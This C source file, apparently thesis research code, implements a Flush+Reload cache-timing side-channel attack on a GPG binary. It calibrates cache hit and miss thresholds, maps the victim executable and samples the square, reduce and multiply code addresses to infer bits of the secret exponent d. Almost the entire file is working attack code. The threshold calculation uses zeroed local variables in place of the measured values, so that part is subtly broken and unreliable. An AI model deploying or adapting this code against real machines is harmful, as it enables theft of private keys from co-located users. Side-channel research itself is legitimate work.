#define _GNU_SOURCE

#include "../../Utils/src/cachetechniques.h"
#include "../../Utils/src/flushspy.h"
#include "../../Utils/src/fileutils.h"

#define ANALYSIS_CSV_FILENAME "/home/root/thesis-code/flush_reload_static_analysis.csv"
#define GPG_MAX_SIZE_BYTES 4194304
#define THRESHOLD 45
#define DELAYFORVICTIMACTIVITY 2800
#define MAXIDLECOUNT 500
#define OUTPUTRAWDATA 1
#define VARIATION_ANALYSIS_DATA_FILENAME "/home/root/thesis-code/fr_llc_hit_miss_variation_static_analysis.data"
#define VARIATION_ANALYSIS_DATA_DIRECTORY "/home/root/thesis-code/"

typedef struct evictiondata {
	unsigned int maxhit;
	unsigned int maxmiss;
	int threshold;
	double countcorrecthits;
	double allhits;
	double hitsrate;
	double countcorrectmisses;
	double allmisses;
	double evictionrate;
	unsigned int *hit_counts;
	unsigned int *miss_counts;
}evictiondata_t;

void obtainthreshold(int histogramsize, int histogramscale, evictiondata_t *evictiondata) {
	const int MAX_RUNS = 4 * 1024 * 1024;
	const int PAGES_SIZE = 4096;
	const int MID_ARRAY = PAGES_SIZE / 2;
	void *array;
	evictiondata->hit_counts = calloc(histogramsize, sizeof(unsigned int));
	evictiondata->miss_counts = calloc(histogramsize, sizeof(unsigned int));

	int i;
	array = mmap(0, PAGES_SIZE, PROT_READ | PROT_WRITE,
	MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	reload(array + MID_ARRAY);
	sched_yield();
	//4MB
	for (i = 0; i < MAX_RUNS; ++i) {
		unsigned long time = reload(array + MID_ARRAY) / histogramscale;
		evictiondata->hit_counts[time > (histogramsize - 1) ? histogramsize - 1 : time]++;
		sched_yield();
	}

	for (i = 0; i < MAX_RUNS; ++i) {
		flush(array + MID_ARRAY);
		unsigned long time = reload(array + MID_ARRAY) / histogramscale;
		evictiondata->miss_counts[time > (histogramsize - 1) ? histogramsize - 1 : time]++;
		sched_yield();
	}
	unsigned int hitmax = 0;
	unsigned int missmax = 0;
	unsigned int hitmaxindex = 0;
	unsigned int missmaxindex = 0;
	unsigned int missminindex = 0;
	printf("TSC:           HITS           MISSES\n");
	for (i = 0; i < histogramsize; ++i) {
		printf("%3d: %10zu %10zu\n", i * histogramscale, evictiondata->hit_counts[i],
				evictiondata->miss_counts[i]);
		if (hitmax < evictiondata->hit_counts[i]) {
			hitmax = evictiondata->hit_counts[i];
			hitmaxindex = i;
		}
		if (missmax < evictiondata->miss_counts[i]) {
			missmax = evictiondata->miss_counts[i];
			missmaxindex = i;
		}
		if (evictiondata->miss_counts[i] > 3 && missminindex == 0)
			missminindex = i;
	}
	double countcorrectmisses = 0, allmisses = 0, countcorrecthits = 0, allhits = 0;
	int maxhit = 0, maxmiss = 0, threshold = 0;
	evictiondata->maxhit = hitmaxindex * histogramscale;
	evictiondata->maxmiss = missmaxindex * histogramscale;
	evictiondata->threshold = maxmiss - (maxmiss - maxhit) / 2;

	for (i = 0; i < histogramsize; ++i) {
		if (evictiondata->miss_counts[i] > 0 && (i * histogramscale) > threshold) {
			++countcorrectmisses;
		}
		if (evictiondata->miss_counts[i] > 0) {
			++allmisses;
		}
		if (evictiondata->hit_counts[i] > 0 && (i * histogramscale) < threshold) {
			++countcorrecthits;
		}
		if (evictiondata->hit_counts[i] > 0) {
			++allhits;
		}
	}

	evictiondata->countcorrecthits = countcorrecthits;
	evictiondata->countcorrectmisses = countcorrectmisses;
	evictiondata->allhits = allhits;
	evictiondata->allmisses = allmisses;
	evictiondata->evictionrate = (countcorrectmisses / allmisses) * 100;
	evictiondata->hitsrate = (countcorrecthits / allhits) * 100;

	printf("\nMax Hit: %u\n", evictiondata->maxhit);
	printf("\nMax Miss: %u\n", evictiondata->maxmiss);
	printf("\nThreshold: %u\n", evictiondata->threshold);
	printf("\nHits Rate: %lf\%\n", evictiondata->hitsrate);
	printf("\nEviction Rate: %lf\%\n", evictiondata->evictionrate);

}

//0-square
//1-reduce
//2-multiply
void obtainmaxtimesabovethreshold(unsigned int* numberoftimesabovethreshold,
		unsigned int threshold, unsigned int rowsize, unsigned int columnsize,
		unsigned int src[][columnsize]) {
	int i, j;
	unsigned int max = 0;

	for (j = 0; j < columnsize; ++j) {
		for (i = 0; i < rowsize - 1; i++) {
			if (src[i][j] <= threshold && src[i][j] > 0) {
				++numberoftimesabovethreshold[j];
			} else {
				numberoftimesabovethreshold[j] = 0;
			}
			if (numberoftimesabovethreshold[j] > max) {
				max = numberoftimesabovethreshold[j];
			}
		}
		numberoftimesabovethreshold[j] = max;
		printf("Max times %u address: %u\n", j, max);
	}
}

void obtaindparameternumberofbits(unsigned int threshold, unsigned int rowsize,
		unsigned int columnsize, unsigned int src[][columnsize],
		unsigned int out_numberofbits[columnsize]) {
	unsigned int numberoftimesabovethreshold[columnsize];
	int i, j;
	memset(numberoftimesabovethreshold, 0, sizeof(unsigned int) * columnsize);
	memset(out_numberofbits, 0, sizeof(unsigned int) * columnsize);
	obtainmaxtimesabovethreshold(numberoftimesabovethreshold, threshold,
			rowsize, columnsize, src);

	for (j = 0; j < columnsize; ++j) {
		unsigned int numberoftimes = 0;
		for (i = 0; i < rowsize - 1; i++) {
			if (src[i][j] <= threshold && src[i][j] > 0) {
				++numberoftimes;
			} else {
				if (numberoftimes > numberoftimesabovethreshold[j] * 0.5
						&& numberoftimes <= numberoftimesabovethreshold[j]) {
					++out_numberofbits[j];
				}
				numberoftimes = 0;
			}
		}
		//printf("Number of bits of %u index address: %u\n", j, out_numberofbits[j]);
	}
}

int analysecache(int delay, long int exe_addrs[MAX_ADDRS_TO_MONITOR],
		int nr_addrs,
		unsigned int analysis_array[MAX_TIMES_TO_MONITOR_EACH_ADDRS][nr_addrs]) {
	int fd_exe;
	struct stat sbuff;
	char* mapping_addr;

	//share the executable
	fd_exe = open(EXE_FILENAME, O_RDONLY);
	if (fd_exe == -1)
		handle_error("open_exe_filename");
	if (fstat(fd_exe, &sbuff) == -1)
		handle_error("fstat");
	mapping_addr = (char*) mmap(0, GPG_MAX_SIZE_BYTES, PROT_READ, MAP_PRIVATE,
			fd_exe, 0);
	if (mapping_addr == MAP_FAILED)
		handle_error("mmap");
	printf(".exe shared\n");

	unsigned long ptr_offset = (unsigned long) mapping_addr;

	//monitor .exe addrs
	printf(".exe addrs monitor\n");

	//Begin NEW
	unsigned long long start = getcurrenttsc();
	fr_analysealladdrs(OUTPUTRAWDATA, analysis_array[0], ptr_offset, exe_addrs,
			nr_addrs,
			THRESHOLD);
	do {
		do {
			start += delay;
		} while (missedvictimactivity(start));
		fr_analysealladdrs(OUTPUTRAWDATA, analysis_array[0], ptr_offset,
				exe_addrs, nr_addrs,
				THRESHOLD);
	} while (!isvictimactive(analysis_array[0], nr_addrs,
	OUTPUTRAWDATA ? THRESHOLD : 2));

	int idle = 0, i = 1, missedactivity = 0, missrate = 0;

	for (i = 1, idle = 0;
			idle < MAXIDLECOUNT && i < MAX_TIMES_TO_MONITOR_EACH_ADDRS;
			++idle, ++i) {
		if (!missedactivity) {
			fr_analysealladdrs(OUTPUTRAWDATA, analysis_array[i], ptr_offset,
					exe_addrs, nr_addrs,
					THRESHOLD);
			if (isvictimactive(analysis_array[i], nr_addrs,
			OUTPUTRAWDATA ? THRESHOLD : 2))
				idle = 0;
		} else {
			missedalladdrs(analysis_array[i], ptr_offset, exe_addrs, nr_addrs);
			++missrate;
		}

		start += delay;
		missedactivity = missedvictimactivity(start);

	}
	printf(".exe results to csv file\n");
	printf("Missed samples: %d\n", missrate);
	printf("Samples: %d\n", i);
	munmap(mapping_addr, sbuff.st_size);
	close(fd_exe);
	return i;
}

void autoobtaindelay() {
	int delay, i = 0, nr_addrs;
	long int exe_addrs[MAX_ADDRS_TO_MONITOR];
	const int max_delay = 5000;

	//obtain the addrs to monitor
	nr_addrs = getaddrstomonitor(EXE_ADDRS_FILENAME, exe_addrs);
	unsigned int delay_array[max_delay][nr_addrs];

	for (delay = 600; delay < max_delay; delay += 100) {

		setcoreaffinity(0);
		unsigned int analysis_array[MAX_TIMES_TO_MONITOR_EACH_ADDRS][nr_addrs];

		//analyse LLC
		printf("Analyse Cache delay: %d\n\n", delay);
		int analysis_array_length = analysecache(delay, exe_addrs, nr_addrs,
				analysis_array);

		obtaindparameternumberofbits(THRESHOLD, analysis_array_length, nr_addrs,
				analysis_array, delay_array[i]);
		++i;
	}
	biarraytocsvwithhexheaders(ANALYSIS_CSV_FILENAME, exe_addrs, i, nr_addrs,
			delay_array);

}

void analysehitandmissvariation() {
	int i;
	evictiondata_t *evictiondata = calloc(1, sizeof(evictiondata_t));
	const int headerssize = 2;
	const int analysissize = 20;

	unsigned int analysis_array[analysissize][headerssize];

	for (i = 0; i < analysissize; ++i) {
		obtainthreshold(300, 5, evictiondata);
		analysis_array[i][0] = evictiondata->maxhit;
		analysis_array[i][1] = evictiondata->maxmiss;
	}
	const char *headers[headerssize];
	headers[0] = "Hits";
	headers[1] = "Misses";
	biarraytocsvwithstrheaders(VARIATION_ANALYSIS_DATA_FILENAME, headers,
			analysissize, headerssize, analysis_array);
}

int main() {

	//Set affinity to the 1st core
	setcoreaffinity(0);

	//Generate graph to MaxHit MaxMiss Histogram variation
	//analysehitandmissvariation();

//	const unsigned long long THRESHOLD = 45;
	evictiondata_t *evictiondata = calloc(1, sizeof(evictiondata_t));
	const int histogramscale = 5;
	const int histogramsize = 300;
	obtainthreshold(histogramsize, histogramscale,evictiondata);
	printf("THRESHOLD ::: %d\n\r", evictiondata->threshold);


	const char *prefix = "LLC";
	char *dirwithprefix = concat(VARIATION_ANALYSIS_DATA_DIRECTORY, prefix);
	char *dstfilename = concat(dirwithprefix, "_flush_reload_histogram.data");
	twoarraystocsvwithstrheaders(dstfilename, "Reload(Hit)",
			"Flush+Reload(Miss)", histogramscale, histogramsize,
			evictiondata->hit_counts, evictiondata->miss_counts);



	//Auto obtain the best delay
//	autoobtaindelay();

	long int exe_addrs[MAX_ADDRS_TO_MONITOR];
	int nr_addrs;

	//obtain the addrs to monitor
	nr_addrs = getaddrstomonitor(EXE_ADDRS_FILENAME, exe_addrs);

	unsigned int analysis_array[MAX_TIMES_TO_MONITOR_EACH_ADDRS][nr_addrs];

	//analyse LLC
	int analysis_array_length = analysecache(DELAYFORVICTIMACTIVITY, exe_addrs,
			nr_addrs, analysis_array);

	//results to csv file
	biarraytocsvwithhexheaders(ANALYSIS_CSV_FILENAME, exe_addrs,
			analysis_array_length, nr_addrs, analysis_array);

	unsigned int out_numberofbits[nr_addrs];
	obtaindparameternumberofbits(THRESHOLD, analysis_array_length, nr_addrs,
			analysis_array, out_numberofbits);

	return 0;
}
